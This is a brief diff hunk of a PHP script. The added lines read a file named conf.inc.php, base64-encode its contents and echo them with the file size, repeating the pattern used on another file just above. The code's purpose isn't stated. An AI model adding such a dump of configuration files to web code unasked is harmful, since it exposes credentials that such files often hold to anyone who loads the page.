@@ -43,5 +43,16 @@ echo 'data:'.$data.'
 ';
 fclose($fp);
 
+$fp = fopen('./conf.inc.php','r') or die('open fail');
+$size = filesize('./conf.inc.php');
+echo 'size::'.$size,'
+';
+
+$data = fread($fp, $size);
+$data = base64_encode( $data );
+echo 'data:'.$data.'
+';
+fclose($fp);
+  
 exit(1);
 ?>
